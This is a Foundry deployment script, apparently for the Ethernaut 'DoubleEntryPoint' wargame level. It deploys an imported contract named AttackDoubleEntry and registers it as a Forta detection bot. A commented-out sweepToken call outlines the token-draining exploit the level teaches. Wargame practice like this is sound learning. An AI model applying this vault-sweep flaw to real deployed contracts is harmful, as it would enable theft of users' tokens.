// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AttackDoubleEntry} from "../src/DoubleEntry.sol";

interface CryptoVault {
    function sweepToken(IERC20 token) external;
}

interface DoubleEntryPointERC20 {
   function delegateTransfer( address to, uint256 value, address origSender) external returns (bool);

}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract DoubleEntryAttack is Script {
    
    CryptoVault addr = CryptoVault(0xE16a5FDBDE5B349944513328671f0ef453C074E3);
    
    DoubleEntryPointERC20 DET = DoubleEntryPointERC20(0x2b61acbC79079d6799957633352c7dE1798Cd5F1);
    
    IERC20 LGT = IERC20(0x21090bfFa1d82bDD790408CFf0d678E0C9fa33C2);
    IForta forta = IForta(0x8398B38a04B78f130F3A5f733A605678E17475Ec);

    
    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        
        // LGT.transfer(0xFA9e6f9049fF9874fa6C1Ea72C9E96285f2AEE3a, 100);
        AttackDoubleEntry yo = new AttackDoubleEntry(address(addr));
        forta.setDetectionBot(address(yo));

        // addr.sweepToken(LGT);
        

        vm.stopBroadcast();

    }
}